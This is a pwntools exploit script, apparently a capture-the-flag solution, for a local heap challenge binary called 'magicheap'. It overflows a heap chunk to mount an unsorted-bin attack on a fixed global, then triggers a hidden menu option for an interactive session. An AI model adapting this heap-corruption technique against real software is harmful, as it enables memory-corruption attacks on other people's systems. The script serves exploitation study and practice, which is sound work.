from pwn import *

p = process("./magicheap")
elf = ELF("./magicheap")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

cmd = lambda c : p.sendlineafter("choice :" , str(c))

def add(size , content):
	cmd(1)
	p.sendlineafter("Heap : " , str(size))
	p.sendafter("Content of heap:" , content)

def edit(index , size , content ):
	cmd(2)
	p.sendlineafter("Index :" , str(index))
	p.sendlineafter("Size of Heap : " , str(size))
	p.sendafter("Content of heap : " , content)

def delete(index):
	cmd(3)
	p.sendlineafter("Index :" , str(index))

magic_addr = 0x6020C0
add(0x20 , "fantasy")
add(0x80 , "fantasy")
add(0x80 , "fantasy")

delete(1)
edit(0 , 0xa0 , "a" * 0x20 + p64(0) + p64(0x91) + p64(0) + p64(magic_addr - 0x10))
add(0x80 , "fantasy")
cmd(0x1305)
p.interactive()